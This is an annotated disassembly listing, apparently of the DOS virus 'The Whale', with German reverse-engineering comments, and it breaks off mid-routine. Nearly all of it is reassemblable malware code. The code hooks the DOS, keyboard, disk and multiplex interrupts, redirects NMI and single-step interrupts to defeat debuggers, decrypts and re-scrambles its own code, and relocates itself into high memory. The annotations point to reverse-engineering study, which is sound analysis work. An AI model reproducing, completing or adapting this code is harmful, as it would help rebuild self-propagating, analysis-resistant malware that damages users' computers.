TITLE   WHALE   4-22-91 [4-25-91]

PATCH83 MACRO
ORG $-3
DB  81
ORG $+2
DB  0
ENDM
;
RET_FAR MACRO
DB  0CBH
ENDM
;
RET_NEAR    MACRO
DB  0C3H
ENDM
;
.RADIX  16
LF  EQU 0AH
CR  EQU 0DH
;
;INITIAL VALUES :   CS:IP   0000:0100
;           SS:SP   0000:FFFF
S0000   SEGMENT
    ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000
    ORG $+0100H
L0000   EQU $-100
L0001   EQU $-0FF
L0002   EQU $-0FE
L0003   EQU $-0FDH
L0004   EQU $-0FC
L0005   EQU $-0FBH
L0006   EQU $-0FA
L0007   EQU $-0F9
L0008   EQU $-0F8
L0009   EQU $-0F7
L000A   EQU $-0F6
L000B   EQU $-0F5
L000C   EQU $-0F4
L000D   EQU $-0F3
L000E   EQU $-0F2
L000F   EQU $-0F1
L0010   EQU $-0F0
L0011   EQU $-0EF
L0012   EQU $-0EE
L0013   EQU $-0EDH
L0014   EQU $-0EC
L0015   EQU $-0EBH
L0016   EQU $-0EA
L0017   EQU $-0E9
L0018   EQU $-0E8
L0019   EQU $-0E7
L001A   EQU $-0E6
L001B   EQU $-0E5
L001C   EQU $-0E4
L001D   EQU $-0E3
L001E   EQU $-0E2
L001F   EQU $-0E1
L0020   EQU $-0E0
L0021   EQU $-0DF
L0022   EQU $-0DE
L0023   EQU $-0DDH
L0024   EQU $-0DC
L0025   EQU $-0DBH
L0026   EQU $-0DA
L0027   EQU $-0D9
L0028   EQU $-0D8
L0029   EQU $-0D7
L002A   EQU $-0D6
L002B   EQU $-0D5
L002C   EQU $-0D4
L002D   EQU $-0D3
L002E   EQU $-0D2
L002F   EQU $-0D1
L0032   EQU $-0CE
L0033   EQU $-0CDH
L0034   EQU $-0CC
L0036   EQU $-0CA
L0037   EQU $-0C9
L0038   EQU $-0C8
L0039   EQU $-0C7
L003A   EQU $-0C6
L003B   EQU $-0C5
L003C   EQU $-0C4
L003D   EQU $-0C3
L003E   EQU $-0C2
L003F   EQU $-0C1
L0040   EQU $-0C0
L0041   EQU $-0BF
L0042   EQU $-0BE
L0044   EQU $-0BC
L0047   EQU $-0B9
L004A   EQU $-0B6
L004B   EQU $-0B5
L004C   EQU $-0B4
L004E   EQU $-0B2
L004F   EQU $-0B1
L0050   EQU $-0B0
L0051   EQU $-0AF
L0052   EQU $-0AE
L0053   EQU $-0ADH
L0054   EQU $-0AC
L0055   EQU $-0ABH
L0056   EQU $-0AA
L0057   EQU $-0A9
L005B   EQU $-0A5
L005D   EQU $-0A3
L005E   EQU $-0A2
L0060   EQU $-0A0
L0061   EQU $-9F
L0062   EQU $-9E
L0063   EQU $-9DH
L0065   EQU $-9BH
L0067   EQU $-99
L0068   EQU $-98
L0069   EQU $-97
L006C   EQU $-94
L006D   EQU $-93
L006E   EQU $-92
L0070   EQU $-90
L0072   EQU $-8E
L0073   EQU $-8DH
L0074   EQU $-8C
L0075   EQU $-8BH
L0076   EQU $-8A
L0077   EQU $-89
L0078   EQU $-88
L007A   EQU $-86
L007D   EQU $-83
L0080   EQU $-80
L0081   EQU $-7F
L0083   EQU $-7DH
L0084   EQU $-7C
L0085   EQU $-7BH
L0086   EQU $-7A
L0087   EQU $-79
L008B   EQU $-75
L008C   EQU $-74
L008D   EQU $-73
L008E   EQU $-72
L008F   EQU $-71
L0090   EQU $-70
L009B   EQU $-65
L009C   EQU $-64
L00A7   EQU $-59
L00AB   EQU $-55
L00B2   EQU $-4E
L00B3   EQU $-4DH
L00B8   EQU $-48
L00BB   EQU $-45
L00BC   EQU $-44
L00BF   EQU $-41
L00C0   EQU $-40
L00C1   EQU $-3F
L00C3   EQU $-3DH
L00C5   EQU $-3BH
L00C6   EQU $-3A
L00C8   EQU $-38
L00CB   EQU $-35
L00CC   EQU $-34
L00D1   EQU $-2F
L00D6   EQU $-2A
L00D8   EQU $-28
L00DF   EQU $-21
L00E0   EQU $-20
L00E2   EQU $-1E
L00E8   EQU $-18
L00E9   EQU $-17
L00EA   EQU $-16
L00EB   EQU $-15
L00EF   EQU $-11
L00F0   EQU $-10
L00F2   EQU $-0E
L00F5   EQU $-0BH
L00F6   EQU $-0A
L00F7   EQU $-9
L00F8   EQU $-8
L00F9   EQU $-7
L00FB   EQU $-5
L00FD   EQU $-3
L00FE   EQU $-2
L00FF   EQU $-1
L0100:  JMP L4BCC

L0102   EQU $-1
    XCHG    BP,AX
L0104:  INT 3
    MOV CH,90
    NOP                 ;2710 90
    NOP                 ;2711 90
    NOP                 ;2712 90
    NOP                 ;2713 90
    NOP                 ;2714 90
    NOP                 ;2715 90
    NOP                 ;2716 90
    NOP                 ;2717 90
    NOP                 ;2718 90
    NOP                 ;2719 90
                        ;L271A    L46BE DI
L271A:  NOP                 ;271A 90
    NOP                 ;271B 90
    NOP                 ;271C 90
    NOP                 ;271D 90
    NOP                 ;271E 90
    NOP                 ;271F 90
    NOP                 ;2720 90
    NOP                 ;2721 90
    NOP                 ;2722 90
    NOP                 ;2723 90
    NOP                 ;2724 90
    NOP                 ;2725 90
    NOP                 ;2726 90
    NOP                 ;2727 90
    NOP                 ;2728 90
    NOP                 ;2729 90
    NOP                 ;272A 90
    NOP                 ;272B 90
    NOP                 ;272C 90
    NOP                 ;272D 90
    NOP                 ;272E 90
    NOP                 ;272F 90
    NOP                 ;2730 90
    NOP                 ;2731 90
    NOP                 ;2732 90
                        ;L2733    L4628 DR
L2733:  NOP                 ;2733 90
    NOP                 ;2734 90
    NOP                 ;2735 90
    NOP                 ;2736 90
    NOP                 ;2737 90
    NOP                 ;2738 90
    NOP                 ;2739 90
    NOP                 ;273A 90
    NOP                 ;273B 90
    NOP                 ;273C 90
    NOP                 ;273D 90
    NOP                 ;273E 90
    NOP                 ;273F 90
    NOP                 ;2740 90
    NOP                 ;2741 90
    NOP                 ;2742 90
    NOP                 ;2743 90
    NOP                 ;2744 90
    NOP                 ;2745 90
    NOP                 ;2746 90
    NOP                 ;2747 90
    NOP                 ;2748 90
    NOP                 ;2749 90
    NOP                 ;274A 90
    NOP                 ;274B 90
    NOP                 ;274C 90
    NOP                 ;274D 90
    NOP                 ;274E 90
    NOP                 ;274F 90
    NOP                 ;2750 90
    NOP                 ;2751 90
    NOP                 ;2752 90
    NOP                 ;2753 90
    NOP                 ;2754 90
    NOP                 ;2755 90
    NOP                 ;2756 90
    NOP                 ;2757 90
    NOP                 ;2758 90
    NOP                 ;2759 90
    NOP                 ;275A 90
    NOP                 ;275B 90
    NOP                 ;275C 90
    NOP                 ;275D 90
    NOP                 ;275E 90
    NOP                 ;275F 90
    NOP                 ;2760 90
    NOP                 ;2761 90
    NOP                 ;2762 90
    NOP                 ;2763 90
    NOP                 ;2764 90
    NOP                 ;2765 90
    NOP                 ;2766 90
    NOP                 ;2767 90
    NOP                 ;2768 90
    NOP                 ;2769 90
    NOP                 ;276A 90
    NOP                 ;276B 90
    NOP                 ;276C 90
    NOP                 ;276D 90
    NOP                 ;276E 90
    NOP                 ;276F 90
    NOP                 ;2770 90
    NOP                 ;2771 90
    NOP                 ;2772 90
    NOP                 ;2773 90
    NOP                 ;2774 90
    NOP                 ;2775 90
    NOP                 ;2776 90
    NOP                 ;2777 90
    NOP                 ;2778 90
    NOP                 ;2779 90
    NOP                 ;277A 90
    NOP                 ;277B 90
    NOP                 ;277C 90
    NOP                 ;277D 90
    NOP                 ;277E 90
    NOP                 ;277F 90
    NOP                 ;2780 90
    NOP                 ;2781 90
    NOP                 ;2782 90
    NOP                 ;2783 90
    NOP                 ;2784 90
    NOP                 ;2785 90
    NOP                 ;2786 90
    NOP                 ;2787 90
    NOP                 ;2788 90
    NOP                 ;2789 90
    NOP                 ;278A 90
    NOP                 ;278B 90
    NOP                 ;278C 90
    NOP                 ;278D 90
    NOP                 ;278E 90
    NOP                 ;278F 90
    NOP                 ;2790 90
    NOP                 ;2791 90
    NOP                 ;2792 90
    NOP                 ;2793 90
    NOP                 ;2794 90
    NOP                 ;2795 90
    NOP                 ;2796 90
    NOP                 ;2797 90
    NOP                 ;2798 90
    NOP                 ;2799 90
    NOP                 ;279A 90
    NOP                 ;279B 90
    NOP                 ;279C 90
    NOP                 ;279D 90
    NOP                 ;279E 90
    NOP                 ;279F 90
    NOP                 ;27A0 90
    NOP                 ;27A1 90
    NOP                 ;27A2 90
    NOP                 ;27A3 90
    NOP                 ;27A4 90
    NOP                 ;27A5 90
    NOP                 ;27A6 90
    NOP                 ;27A7 90
    NOP                 ;27A8 90
    NOP                 ;27A9 90
    NOP                 ;27AA 90
    NOP                 ;27AB 90
    NOP                 ;27AC 90
    NOP                 ;27AD 90
    NOP                 ;27AE 90
    NOP                 ;27AF 90
    NOP                 ;27B0 90
    NOP                 ;27B1 90
    NOP                 ;27B2 90
    NOP                 ;27B3 90
    NOP                 ;27B4 90
    NOP                 ;27B5 90
    NOP                 ;27B6 90
    NOP                 ;27B7 90
    NOP                 ;27B8 90
    NOP                 ;27B9 90
    NOP                 ;27BA 90
    NOP                 ;27BB 90
    NOP                 ;27BC 90
    NOP                 ;27BD 90
    NOP                 ;27BE 90
    NOP                 ;27BF 90
    NOP                 ;27C0 90
    NOP                 ;27C1 90
    NOP                 ;27C2 90
    NOP                 ;27C3 90
    NOP                 ;27C4 90
    NOP                 ;27C5 90
    NOP                 ;27C6 90
    NOP                 ;27C7 90
    NOP                 ;27C8 90
    NOP                 ;27C9 90
    NOP                 ;27CA 90
    NOP                 ;27CB 90
    NOP                 ;27CC 90
    NOP                 ;27CD 90
    NOP                 ;27CE 90
    NOP                 ;27CF 90
    NOP                 ;27D0 90
    NOP                 ;27D1 90
    NOP                 ;27D2 90
    NOP                 ;27D3 90
    NOP                 ;27D4 90
    NOP                 ;27D5 90
    NOP                 ;27D6 90
    NOP                 ;27D7 90
    NOP                 ;27D8 90
    NOP                 ;27D9 90
    NOP                 ;27DA 90
    NOP                 ;27DB 90
    NOP                 ;27DC 90
    NOP                 ;27DD 90
    NOP                 ;27DE 90
    NOP                 ;27DF 90
    NOP                 ;27E0 90
    NOP                 ;27E1 90
    NOP                 ;27E2 90
    NOP                 ;27E3 90
    NOP                 ;27E4 90
    NOP                 ;27E5 90
    NOP                 ;27E6 90
    NOP                 ;27E7 90
    NOP                 ;27E8 90
    NOP                 ;27E9 90
    NOP                 ;27EA 90
    NOP                 ;27EB 90
    NOP                 ;27EC 90
    NOP                 ;27ED 90
    NOP                 ;27EE 90
    NOP                 ;27EF 90
    NOP                 ;27F0 90
    NOP                 ;27F1 90
    NOP                 ;27F2 90
    NOP                 ;27F3 90
    NOP                 ;27F4 90
    NOP                 ;27F5 90
    NOP                 ;27F6 90
    NOP                 ;27F7 90
    NOP                 ;27F8 90
    NOP                 ;27F9 90
    NOP                 ;27FA 90
    NOP                 ;27FB 90
    NOP                 ;27FC 90
    NOP                 ;27FD 90
    NOP                 ;27FE 90
    NOP                 ;27FF 90
    NOP                 ;2800 90
    NOP                 ;2801 90
    NOP                 ;2802 90
    NOP                 ;2803 90
    NOP                 ;2804 90
    NOP                 ;2805 90
    MOV AH,4C   ;'L'            ;2806 B4 4C
    MOV AL,L280E            ;2808 A0 0E 28
    INT 21              ;280B CD 21
                        ;L280D    L4559 DI
L280D:  ADD [BX+SI],AL          ;280D 00 00
                        ;L280E    L2808 DR
L280E   EQU $-1
    ADD [BX+SI],AL          ;280F 00 00
    JMP L4BCC               ;2811 E9 B8 23

    JMP L4F1A               ;2814 E9 03 27

    NOP                 ;2817 90
    NOP                 ;2818 90
    NOP                 ;2819 90
    NOP                 ;281A 90
    NOP                 ;281B 90
    NOP                 ;281C 90
    NOP                 ;281D 90
    NOP                 ;281E 90
    NOP                 ;281F 90
    NOP                 ;2820 90
    NOP                 ;2821 90
    NOP                 ;2822 90
    NOP                 ;2823 90
    NOP                 ;2824 90
    NOP                 ;2825 90
    NOP                 ;2826 90
    NOP                 ;2827 90
    NOP                 ;2828 90
    NOP                 ;2829 90
    NOP                 ;282A 90
    NOP                 ;282B 90
    NOP                 ;282C 90
    NOP                 ;282D 90
    NOP                 ;282E 90
    NOP                 ;282F 90
    DB  0               ;2830 00
                        ;L2831    L4BF2 CJ
L2831:  CALL    L288E           ;iret nach 2983 ;2831 E8 5A 00
                        ;L2834    L3505 DI
L2834   DB  'THE WHALE'         ;2834 54 48 45 20 57 48 41 4C 45
    PUSH    CS:L06C7            ;283D 2E FF 36 C7 06
    PUSH    BX              ;2842 53
    INC WORD PTR L0458          ;2843 FF 06 58 04
    JNZ L284C               ;2847 75 03
    JMP L2A4F               ;2849 E9 03 02

                        ;L284C    L2847 CJ  L2857 CJ
L284C:  MOV AX,CS:[BX]          ;284C 2E 8B 07
    ADD BX,2                ;284F 83 C3 02
    JZ  L287E               ;2852 74 2A
    ADD CS:[BX],AX          ;2854 2E 01 07
    LOOP    L284C               ;2857 E2 F3
    POP BX              ;2859 5B
    DW  L8F2E               ;285A 2E 8F
    DB  6               ;285C 06
                        ;L285D    L28AE CC
;   Code generieren bei cs:255b-256e + 2810 -> 4d6b-4d7f (nach eof), ret nach 28b3
L285D:  MOV WORD PTR L2566,OFFSET L2568 ;'%h'   
                        ;285D C7 06 66 25 68 25
    POP BX              ;2863 5B
    MOV WORD PTR L2568,OFFSET L2E9C ;2864 C7 06 68 25 9C 2E
    ADD BX,2                ;286A 83 C3 02
    MOV WORD PTR L256A,OFFSET L1EFF ;286D C7 06 6A 25 FF 1E
    MOV WORD PTR L256C,OFFSET L2435 ;'$5'   
                        ;2873 C7 06 6C 25 35 24
    PUSH    BX              ;2879 53
    MOV WORD PTR L256E,0C3      ;287A C7 06 6E 25 C3 00
                        ;L287E    L2852 CJ
L287E   EQU $-2
    MOV WORD PTR L255B,OFFSET L2700 ;2880 C7 06 5B 25 00 27
    RET_NEAR                ;2886 C3

    DW  L2E51,L0F8B,L8B2E       ;2887 51 2E 8B 0F 2E 8B
    DB  1E              ;288D 1E
                        ;L288E    L2831 CC
;   iret nach 2983
L288E:  POP BX              ;288E 5B
    ADD BX,OFFSET L014F         ;288F 81 C3 4F 01
    PUSHF                   ;2893 9C
    PUSH    CS              ;2894 0E
    PUSH    BX              ;2895 53
    MOV SI,BX               ;2896 89 DE
    IRET                    ;2898 CF

    DW  L31E9,LFF02,L29B4,L5901,LFF2E   ;2899 E9 31 02 FF B4 29 01 59 2E FF
    DW  L2E07,L3723,LF35F,LEBA4     ;28A3 07 2E 23 37 5F F3 A4 EB
    PUSH    DS              ;28AB 1E
    PUSH    CS              ;28AC 0E
    POP DS              ;28AD 1F
    CALL    L285D           ;Code generieren bei cs:255b-256e + 2810 -> 4d6b-4d7f (nach eof), ret nach 28b3 
                        ;28AE E8 AC FF
    DW  L58EA               ;28B1 EA 58
    MOV BX,OFFSET L0837         ;28B3 BB 37 08
    XOR WORD PTR [BX],OFFSET LEF15  ;28B6 81 37 15 EF
    ADD BX,2                ;28BA 83 C3 02
    XOR WORD PTR [BX],OFFSET L4568  ;'Eh'   
                        ;28BD 81 37 68 45
    MOV SI,OFFSET L210A         ;28C1 BE 0A 21
    POP DS              ;28C4 1F
    CALL    L304C           ;obiges xor decodiert 3047-304a, now 26 patches si = 210a + 2810 -> 491a    
                        ;28C5 E8 84 07
    CALL    L3243           ;decode_code    ;28C8 E8 78 09
    DW  L2038               ;28CB 38 20
    CALL    L3146           ;verbiege Int 02 (NMI) auf iret, save auf [2594]:[2592] 
                        ;28CD E8 76 08
    MOV CS:L24E3,AX         ;28D0 2E A3 E3 24
    MOV AH,52   ;'R'            ;28D4 B4 52
    MOV CS:L2445,DS         ;28D6 2E 8C 1E 45 24
    INT 21              ;28DB CD 21
    MOV AX,ES:[BX-2]            ;28DD 26 8B 47 FE
    MOV CS:L2447,AX         ;28E1 2E A3 47 24
    PUSH    CS              ;28E5 0E
    POP DS              ;28E6 1F
    MOV AL,21   ;'!'            ;28E7 B0 21
    CALL    L2CB9           ;get Int (AL) into es:bx    
                        ;28E9 E8 CD 03
    MOV L242F,ES            ;28EC 8C 06 2F 24
    MOV L242D,BX            ;28F0 89 1E 2D 24
    MOV DX,OFFSET L21C6         ;28F4 BA C6 21
    MOV AL,1                ;28F7 B0 01
    MOV BYTE PTR L2450,0        ;28F9 C6 06 50 24 00
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;28FE E8 6B 03
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2901 E8 85 20
    DB  39              ;2904 39
    CALL    L3243           ;decode_code    ;2905 E8 3B 09
    DW  LC03A               ;2908 3A C0
    PUSHF                   ;290A 9C
    POP AX              ;290B 58
    OR  AX,OFFSET L0100         ;290C 0D 00 01
    PUSH    AX              ;290F 50
    POPF                    ;2910 9D
    PUSHF                   ;2911 9C
    MOV AH,61   ;'a'            ;2912 B4 61
    CALL    DWORD PTR   L242D       ;2914 FF 1E 2D 24
    PUSHF                   ;2918 9C
    POP AX              ;2919 58
    AND AX,OFFSET LFEFF         ;291A 25 FF FE
    PUSH    AX              ;291D 50
    POPF                    ;291E 9D
    LES BH,DWORD PTR L242D      ;291F C4 3E 2D 24
    MOV L2437,ES            ;2923 8C 06 37 24
                        ;L2924    L32DF DI
L2924   EQU $-3
    MOV BYTE PTR L244B,0EA      ;2927 C6 06 4B 24 EA
    MOV WORD PTR L244C,OFFSET L2256 ;'"V'   
                        ;292C C7 06 4C 24 56 22
    MOV L2435,DI            ;2932 89 3E 35 24
    MOV L244E,CS            ;2936 8C 0E 4E 24
    CALL    L298D           ;get Int 2f , if 1st MCB <= segm(Int 2f) set int 13 
                        ;293A E8 50 00
    CALL    L2C0F           ;Int 21 patchen auf jmp cs:2256 [244c]:[244e] / repatchen   
                        ;293D E8 CF 02
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2940 E8 46 20
    DB  3BH             ;2943 3B
    CALL    L47D0           ;Code nach TOM kopieren, Code ab 2a15:0000 codieren, retf nach 1b1+2810 -> 29c1 
                        ;2944 E8 89 1E
                        ;L2947    L29D5 CC
;   get Int 09 (Keyb) nach [2585]:[2583], patch Int 09 auf jmp cs:2273
L2947:  CALL    L3243           ;decode_code    ;2947 E8 F9 08
    DW  L2A32               ;294A 32 2A
    PUSH    BX              ;294C 53
    PUSH    ES              ;294D 06
    MOV AL,9                ;294E B0 09
    CALL    L2CB9           ;get Int (AL) into es:bx    
                        ;2950 E8 66 03
    MOV CS:L2585,ES         ;2953 2E 8C 06 85 25
    MOV CS:L2583,BX         ;2958 2E 89 1E 83 25
    MOV BYTE PTR CS:L2570,0EA       ;295D 2E C6 06 70 25 EA
                        ;L295E    L45E4 DI
L295E   EQU $-5
                        ;L295F    L45E0 DW
L295F   EQU $-4
    MOV CS:L2573,CS         ;2963 2E 8C 0E 73 25
    MOV WORD PTR CS:L2571,OFFSET L2273  ;'"s'   
            ;2968 2E C7 06 71 25 73 22
    CALL    L4AC7           ;Int 09 patchen auf jmp cs:2273 [2573]:[2571]   
                        ;296F E8 55 21
    POP ES              ;2972 07
    POP BX              ;2973 5B
    MOV BYTE PTR CS:L2587,0     ;2974 2E C6 06 87 25 00
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;297A E8 0C 20
    DB  33              ;297D 33
    RET_NEAR                ;297E C3

    JMP L43A9               ;297F E9 27 1A

    DB  0EA             ;2982 EA
    SUB SI,OFFSET L0173         ;2983 81 EE 73 01
    JMP L2F15               ;2987 E9 8B 05

    MOV BX,SI               ;298A 89 F3
    DB  0E8             ;298C E8
                        ;L298D    L293A CC
;   get Int 2f , if 1st MCB <= segm(Int 2f) set int 13
L298D:  CALL    L3243           ;decode_code    ;298D E8 B3 08
    DW  LC42E               ;2990 2E C4
    MOV AL,2F   ;'/'            ;2992 B0 2F
    CALL    L2CB9           ;get Int (AL) into es:bx    
                        ;2994 E8 22 03
    MOV BX,ES               ;2997 8C C3
    CMP CS:L2447,BX         ;2999 2E 39 1E 47 24
    JNB L29BC               ;299E 73 1C
    CALL    L482E               ;29A0 E8 8B 1E
    MOV DS,CS:L242F         ;29A3 2E 8E 1E 2F 24
    PUSH    CS:L242D            ;29A8 2E FF 36 2D 24
    POP DX              ;29AD 5A
    MOV AL,13               ;29AE B0 13
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;29B0 E8 B9 02
    XOR BX,BX               ;29B3 33 DB
                        ;L29B4    L289F DI
L29B4   EQU $-1
    MOV DS,BX               ;29B5 8E DB
    MOV BYTE PTR L0475,2        ;29B7 C6 06 75 04 02
                        ;L29BC    L299E CJ
L29BC:  CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;29BC E8 CA 1F
    DB  2F              ;29BF 2F
    RET_NEAR                ;29C0 C3

    CALL    L3243           ;decode_code    ;29C1 E8 7F 08
    DW  LC239               ;29C4 39 C2
    CALL    L2C0F           ;Int 21 patchen auf jmp cs:2256 [244c]:[244e] / repatchen   
                        ;29C6 E8 46 02
    MOV CS:L244E,CS         ;29C9 2E 8C 0E 4E 24
    CALL    L2C0F           ;Int 21 patchen auf jmp cs:2256 [244c]:[244e] / repatchen   
                        ;29CE E8 3E 02
    PUSH    CS              ;29D1 0E
    POP DS              ;29D2 1F
    PUSH    DS              ;29D3 1E
    POP ES              ;29D4 07
    CALL    L2947           ;get Int 09 (Keyb) nach [2585]:[2583], patch Int 09 auf jmp cs:2273 
                        ;29D5 E8 6F FF
    MOV BYTE PTR L258C,0        ;29D8 C6 06 8C 25 00
    CALL    L3186           ;restauriere Int 02 (NMI) auf [2594]:[2592] (Original)  
                        ;29DD E8 A6 07
    MOV AX,L2445            ;29E0 A1 45 24
    MOV ES,AX               ;29E3 8E C0
    LDS DX,DWORD PTR ES:0A      ;29E5 26 C5 16 0A 00
    MOV DS,AX               ;29EA 8E D8
    ADD AX,10               ;29EC 05 10 00
    ADD CS:1A,AX            ;29EF 2E 01 06 1A 00
    CMP BYTE PTR CS:20,0    ;' '    ;29F4 2E 80 3E 20 00 00
    STI                 ;29FA FB
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;29FB E8 8B 1F
    DB  3A              ;29FE 3A
    JNZ L2A2E               ;29FF 75 2D
    CALL    L3243           ;decode_code    ;2A01 E8 3F 08
    DW  LF627               ;2A04 27 F6
    MOV AX,CS:4             ;2A06 2E A1 04 00
    MOV L0100,AX            ;2A0A A3 00 01
    MOV AX,CS:6             ;2A0D 2E A1 06 00
    MOV L0102,AX            ;2A11 A3 02 01
    MOV AX,CS:8             ;2A14 2E A1 08 00
    MOV L0104,AX            ;2A18 A3 04 01
    PUSH    CS:L2445            ;2A1B 2E FF 36 45 24
    XOR AX,AX               ;2A20 33 C0
    INC AH              ;2A22 FE C4
    PUSH    AX              ;2A24 50
    MOV AX,CS:L24E3         ;2A25 2E A1 E3 24
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2A29 E8 5D 1F
    DB  28              ;2A2C 28
    RET_FAR                 ;2A2D CB

                        ;L2A2E    L29FF CJ
L2A2E:  CALL    L3243           ;decode_code    ;2A2E E8 12 08
    DW  LF017               ;2A31 17 F0
                        ;L2A32    L294C DI
L2A32   EQU $-1
    ADD CS:12,AX            ;2A33 2E 01 06 12 00
    MOV AX,CS:L24E3         ;2A38 2E A1 E3 24
                        ;L2A3B    L2A8E CJ
L2A3B   EQU $-1
    MOV SP,CS:14            ;2A3C 2E 8B 26 14 00
                        ;L2A41    L2A94 CJ
L2A41:  MOV SS,CS:12            ;2A41 2E 8E 16 12 00
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2A46 E8 40 1F
    DB  18              ;2A49 18
    JMP DWORD PTR   CS:18       ;2A4A 2E FF 2E 18 00

                        ;L2A4F    L2849 CJ
L2A4F:  PUSH    AX              ;2A4F 50
    MOV AX,0                ;2A50 B8 00 00
    MOV DS,AX               ;2A53 8E D8
    POP AX              ;2A55 58
    MOV BX,L06C7            ;2A56 8B 1E C7 06
                        ;L2A5A    L2A99 CJ
L2A5A:  MOV DS:0C,BX            ;2A5A 89 1E 0C 00
    MOV DS:0E,CS            ;2A5E 8C 0E 0E 00
    DB  0E8             ;2A62 E8
    PUSH    BP              ;2A63 55
    XOR BX,BX               ;2A64 33 DB
    MOV BP,SP               ;2A66 89 E5
    MOV DS,BX               ;2A68 8E DB
    AND WORD PTR [BP+6],OFFSET LFEFF    ;2A6A 81 66 06 FF FE
    MOV DS:4,AX             ;2A6F A3 04 00
    MOV DS:0E,CS            ;2A72 8C 0E 0E 00
                        ;L2A74    L2A83 CJ
L2A74   EQU $-2
    MOV DS:0C,SI            ;2A76 89 36 0C 00
    CALL    L2CD8           ;+7 zu call 2ad2, [2cff]  cc (int 3)-> c3 (ret) 
                        ;2A7A E8 5B 02
    JMP L3972               ;2A7D E9 F2 0E

    MOV SI,OFFSET LABBB         ;2A80 BE BB AB
    JMP SHORT   L2A74           ;2A83 EB EF

    SCASW                   ;2A85 AF
    MOV BX,OFFSET LABEF         ;2A86 BB EF AB
    STOSW                   ;2A89 AB
    MOV DI,OFFSET LEFBF         ;2A8A BF BF EF
    STOSW                   ;2A8D AB
    JMP SHORT   L2A3B           ;2A8E EB AB

    STOSW                   ;2A90 AB
    MOV DI,OFFSET LEFEB         ;2A91 BF EB EF
    JMP SHORT   L2A41           ;2A94 EB AB

    STOSW                   ;2A96 AB
    STI                 ;2A97 FB
    STOSW                   ;2A98 AB
    JMP SHORT   L2A5A           ;2A99 EB BF

    MOV BX,OFFSET LABBF         ;2A9B BB BF AB
                        ;L2A9E    L2AA3 CJ
L2A9E:  JMP SHORT   L2ACE           ;2A9E EB 2E

    OR  BYTE PTR [BX],0ABH      ;2AA0 80 0F AB
    LOOP    L2A9E               ;2AA3 E2 F9
                        ;L2AA5    L3A20 CJ
L2AA5:  CALL    L4978           ;decode 24h Byte von 2aa8-2acb  
                        ;2AA5 E8 D0 1E
    XOR SP,SP               ;2AA8 33 E4
    CALL    CS:2810H        ;wird zu cs , retfar nach cs:009b == cs:2810+9b --> 28abh   
                        ;2AAA E8 00 00
                        ;L2AAD    L2AAA CC
;   wird zu cs , retfar nach cs:009b == cs:2810+9b --> 28abh  
CS:2810H:
    MOV BP,AX               ;2AAD 89 C5
    MOV AX,CS               ;2AAF 8C C8
    MOV BX,10               ;2AB1 BB 10 00
    MUL BX              ;2AB4 F7 E3
    POP CX              ;2AB6 59
    SUB CX,OFFSET L029D         ;2AB7 81 E9 9D 02
    ADD AX,CX               ;2ABB 03 C1
    ADC DX,0                ;2ABD 83 D2 00
    DIV BX              ;2AC0 F7 F3
    PUSH    AX              ;2AC2 50
    MOV AX,9BH              ;2AC3 B8 9B 00
    PUSH    AX              ;2AC6 50
    MOV AX,BP               ;2AC7 89 E8
    CALL    L4956           ;smash code 2aa8-2acb   ;2AC9 E8 8A 1E
    RET_FAR                 ;2ACC CB

    MOV AH,3                ;2ACD B4 03
                        ;L2ACE    L2A9E CJ
L2ACE   EQU $-1
    MOV BX,AX               ;2ACF 8B D8
    DB  0E9             ;2AD1 E9
                        ;L2AD2    L2F37 CC  L2FC4 CC
L2AD2:  CALL    L2AD5           ;Int 01 verbiegen auf CS:2A63, wird mit xlat aufgerufen 
                        ;2AD2 E8 00 00
                        ;L2AD5    L2AD2 CC
;   Int 01 verbiegen auf CS:2A63, wird mit xlat aufgerufen
L2AD5:  POP BX              ;2AD5 5B
    SUB BX,72   ;'r'            ;2AD6 83 EB 72
    PUSH    BX              ;2AD9 53
    POP DS:4                ;2ADA 8F 06 04 00
    PUSH    CS              ;2ADE 0E
    POP DS:6                ;2ADF 8F 06 06 00
    PUSH    CS              ;2AE3 0E
    POP AX              ;2AE4 58
    OR  AX,OFFSET LF346         ;2AE5 0D 46 F3
    PUSH    AX              ;2AE8 50
    POPF                    ;2AE9 9D
    XLAT                    ;2AEA D7
    MOV BH,AL               ;2AEB 8A F8
    ADD BX,CX               ;2AED 01 CB
    JMP L47B1               ;2AEF E9 BF 1C

    MOV AX,[BX]             ;2AF2 8B 07
    MOV BX,[BX+SI]          ;2AF4 8B 18
    XOR AX,AX               ;2AF6 33 C0
    MOV DS,AX               ;2AF8 8E D8
    DB  0EBH                ;2AFA EB
                        ;L2AFB    L44CB CJ
L2AFB:  CALL    L3243           ;decode_code    ;2AFB E8 45 07
    DW  LBB23               ;2AFE 23 BB
    PUSH    BX              ;2B00 53
    MOV BX,SP               ;2B01 8B DC
    MOV BX,SS:[BX+6]            ;2B03 36 8B 5F 06
    MOV CS:L24B3,BX         ;2B07 2E 89 1E B3 24
    POP BX              ;2B0C 5B
    PUSH    BP              ;2B0D 55
    MOV BP,SP               ;2B0E 89 E5
    CALL    L3146           ;verbiege Int 02 (NMI) auf iret, save auf [2594]:[2592] 
                        ;2B10 E8 33 06
    CALL    L2C8B           ;Register sichern ( CS: Stack ) 
                        ;2B13 E8 75 01
    CALL    L2C0F           ;Int 21 patchen auf jmp cs:2256 [244c]:[244e] / repatchen   
                        ;2B16 E8 F6 00
    CALL    L2BD7           ;Register restaurieren ( CS : Stack )   
                        ;2B19 E8 BB 00
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;2B1C E8 1D 01
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;2B1F E8 67 1E
    DB  24              ;2B22 24
    CALL    L3243           ;decode_code    ;2B23 E8 1D 07
    DW  L805A               ;2B26 5A 80
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;2B28 E8 11 01
